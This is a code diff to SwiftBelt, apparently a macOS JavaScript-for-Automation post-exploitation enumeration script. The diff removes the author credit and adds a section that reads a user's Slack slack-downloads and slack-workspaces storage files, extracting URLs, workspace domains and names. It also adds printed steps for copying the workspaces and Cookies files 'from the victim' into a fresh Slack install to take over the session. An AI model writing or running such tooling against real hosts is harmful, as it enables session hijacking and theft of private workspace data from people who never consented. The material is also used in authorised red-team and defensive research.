@@ -1,10 +1,10 @@
-// Written by Cedric Owens @cedowens
 function SwiftBelt () {
 ObjC.import('Cocoa');
 ObjC.import('Foundation');
 ObjC.import('stdlib');
 ObjC.import('OSAKit');
 ObjC.import('OpenDirectory');
+ObjC.import('sqlite3');
 ObjC.bindFunction('CFMakeCollectable', ['id', ['void *'] ]);
 var currentApp = Application.currentApplication();
 currentApp.includeStandardAdditions = true;
@@ -278,6 +278,63 @@ if (fileMan.fileExistsAtPath(zpath)){
         }
 
 }
+
+results += "#######################################\n";
+
+//----------Slack Search-----------------
+var sdPath = "/Users/" + curruser + "/Library/Application Support/Slack/storage/slack-downloads";
+var swPath = "/Users/" + curruser + "/Library/Application Support/Slack/storage/slack-workspaces";
+
+if (fileMan.fileExistsAtPath(sdPath)){
+        try{
+        results += "\n[+] Slack downloads data search:\n";
+        results += "[slack-downloads]";
+        results += "\n";
+        var contents = $.NSString.stringWithContentsOfFileEncodingError(sdPath,$.NSUTF8StringEncoding, $()).js;
+	var contents2 = String(contents);
+	var contents3 = contents2.split(",");
+	for(q = 0; q < contents3.length; q++){
+		if(contents3[q].includes("http")){
+			results += "==> " + contents3[q] + "\n";
+		}
+	}
+        }
+        catch(err){
+                results += err;
+                results += "\n";
+        }
+
+}
+
+
+if (fileMan.fileExistsAtPath(swPath)){
+        try{
+        results += "\n[+] Slack workspaces data search:\n";
+        results += "[slack workspaces]";
+        results += "\n";
+        var contents = $.NSString.stringWithContentsOfFileEncodingError(swPath,$.NSUTF8StringEncoding, $()).js;
+	var contents2 = String(contents);
+	var contents3 = contents2.split(",");
+	for(q = 0; q < contents3.length; q++){
+		if(contents3[q].includes("domain")){
+		results += "==> " + contents3[q] + "\n";
+		}
+		if(contents3[q].includes("name")){
+		results += contents3[q] + "\n";
+		}
+	}
+	
+	results += "\nSteps from Cody's article to load the Slack files found:\n1. Pull the slack-workspaces and Cookies files from the host.\n2. Install a new instance of slack (but don’t sign in to anything)\n3. Close Slack and replace the automatically created Slack/storage/slack-workspaces and Slack/Cookies files with the two you downloaded from the victim\n4. Start Slack";
+
+	}
+        catch(err){
+                results += err;
+                results += "\n";
+        }
+
+}
+
+//console.log(results)
 
 return results
 
